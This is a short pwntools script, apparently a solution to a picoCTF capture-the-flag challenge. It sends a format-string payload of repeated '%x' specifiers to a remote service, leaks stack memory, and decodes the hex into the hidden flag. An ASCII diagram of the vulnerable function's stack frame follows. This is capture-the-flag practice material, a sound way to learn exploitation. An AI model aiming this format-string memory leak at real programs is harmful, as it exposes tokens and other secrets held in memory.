from pwn import *

# string to write to
s = ""

# open up remote connection
r = remote('saturn.picoctf.net', 63922)

# get to vulnerability
r.recvuntil("Tell me a story and then I'll tell you one >> ")

# send string to print stack
r.send( "%x"*50 + "\n")

r.recvuntil("Here's a story - \n")
# receive until the line we want

# read in line
x = r.recvline()
print("lenght: ", len(x))
# remove unwanted components

print(x)
x = x[:].decode()
# parse to characters
for i in [x[j:j+8] for j in range(0, len(x), 8)]:
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

# print string
print(s)





#            ┌──────────────────────────┐  ← High addresses (older frames)
#            │ … return into main() …   │
#            ├──────────────────────────┤
# [ RBP + 8 ]│ ▶ Return address         │  
# [ RBP     ]│ ▶ Saved RBP of buy_stonks│  
#            ├──────────────────────────┤
#            │ ▶ (padding / alignment)  │  
#            ├──────────────────────────┤
#            │ ▶ Pointer user_buf       │  ← local variable (8 bytes)
#            ├──────────────────────────┤
#            │ ▶ Pointer temp           │  ← local Stonk* (8 bytes)
#            ├──────────────────────────┤
#            │ ▶ int shares             │  ← (4 bytes)
#            ├──────────────────────────┤
#            │ ▶ int money              │  ← (4 bytes)
#            ├──────────────────────────┤
#            │ ▶ FILE *f                 │  ← (8 bytes)
#            ├──────────────────────────┤
# [ RBP - 136]│ ▶ (more padding)         │  
#            ├──────────────────────────┤
# [ RBP - 264]│ ▶ api_buf[128]           │  ← buffer holding the “API token” read by fgets
#            ├──────────────────────────┤
#            │ … lower addresses …      │
#            └──────────────────────────┘  ← Low addresses (newer allocations)
